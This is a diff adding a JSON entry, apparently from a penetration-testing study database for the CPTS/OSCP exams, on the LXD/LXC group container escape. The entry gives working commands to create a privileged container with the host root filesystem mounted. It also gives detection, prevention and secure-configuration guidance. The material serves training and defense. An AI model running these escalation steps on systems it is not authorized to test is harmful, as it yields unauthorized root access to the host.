@@ -1,0 +1,105 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "lxc",
+    "lxd"
+  ],
+  "tags": [
+    "lxd",
+    "container-escape",
+    "privileged-group"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Privileged Groups",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Initialize LXD (first-time setup, accept defaults)",
+      "command": "lxd init"
+    },
+    {
+      "label": "Import Alpine image (offline, from transferred tar)",
+      "command": "lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine"
+    },
+    {
+      "label": "Full LXD escape - privileged container mounting host /",
+      "command": "lxc delete privesc --force 2>/dev/null\nlxc init ubuntutemp privesc -c security.privileged=true\nlxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\nlxc start privesc\nlxc exec privesc -- cat /mnt/root/root/flag.txt"
+    }
+  ],
+  "notes": "lxd/lxc membership lets you launch a privileged container with host / mounted at /mnt/root, then read or write any host file as root. Import a small image (Alpine) if none is present.",
+  "references": [
+    {
+      "title": "lxd (linuxcontainers)",
+      "url": "https://github.com/lxc/lxd"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "group-docker",
+      "note": "Docker-group equivalent escape.",
+      "rel": "alternative"
+    },
+    {
+      "id": "linux-enum-users-groups",
+      "note": "Confirms lxd/lxc group membership.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "group-lxd-lxc",
+  "name": "Privileged Groups - LXD/LXC Container Escape",
+  "command": "lxc init <image> r00t -c security.privileged=true",
+  "description": "Members of the lxd/lxc group can launch a privileged container with the host filesystem mounted, giving root-level read/write of the host - a full root escape.",
+  "steps": [
+    {
+      "label": "1. Import an image",
+      "command": "unzip alpine.zip; cd 64-bit\\ Alpine/\nlxd init\nlxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine\n# or: lxc image import ubuntu-template.tar.xz --alias ubuntutemp"
+    },
+    {
+      "label": "2. Create privileged container + mount host /",
+      "command": "lxc init alpine r00t -c security.privileged=true\nlxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true"
+    },
+    {
+      "label": "3. Start, exec, read host root",
+      "command": "lxc start r00t\nlxc exec r00t /bin/sh\ncd /mnt/root/root"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1611"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Members of the 'lxd' group can manage LXD containers. By importing an Alpine image and creating a privileged container (security.privileged=true) with the host filesystem mounted (source=/ path=/mnt/root), a member of the lxd group gains root-equivalent access to the entire host filesystem from within the container.",
+    "prerequisites": "Attacker's user is a member of the 'lxd' or 'lxc' group. LXD daemon running. An importable container image (Alpine) available.",
+    "impact": "Full root-level read/write access to the host filesystem via a privileged LXD container. Can read /etc/shadow, SSH keys, install backdoors, and achieve persistent root access.",
+    "detection": "lxc init with security.privileged=true by lxd-group member. Container configuration with host root mount. LXD audit log: privileged container creation. EDR: access to /mnt/root/root from container process.",
+    "artifacts": "LXD daemon log (privileged container created) | Auditd: lxc exec to access host filesystem | File access log: reads to /mnt/root/root/",
+    "prevention": "Remove unnecessary users from lxd/lxc group. Treat lxd group membership as equivalent to root. Enforce LXD profile restrictions (disallow security.privileged=true). Apply AppArmor LXD profile.",
+    "misconfiguration": "Regular user in 'lxd' group. LXD daemon allows creation of privileged containers with host filesystem mounts without additional authorization.",
+    "vulnerable_config": "# User in lxd group\nid\n# uid=1000(htb-student) groups=...,116(lxd)\n\n# Trivial host escape:\nlxc init alpine r00t -c security.privileged=true\nlxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true",
+    "secure_config": "# Remove from lxd group\ngpasswd -d htb-student lxd\n\n# LXD profile: disallow privileged containers\nlxc profile create restricted\nlxc profile set restricted security.privileged false\nlxc profile set restricted security.nesting false\n\n# Apply to all containers by default",
+    "sources": [
+      "HTB M25",
+      "MITRE T1610",
+      "MITRE T1611"
+    ]
+  }
+}
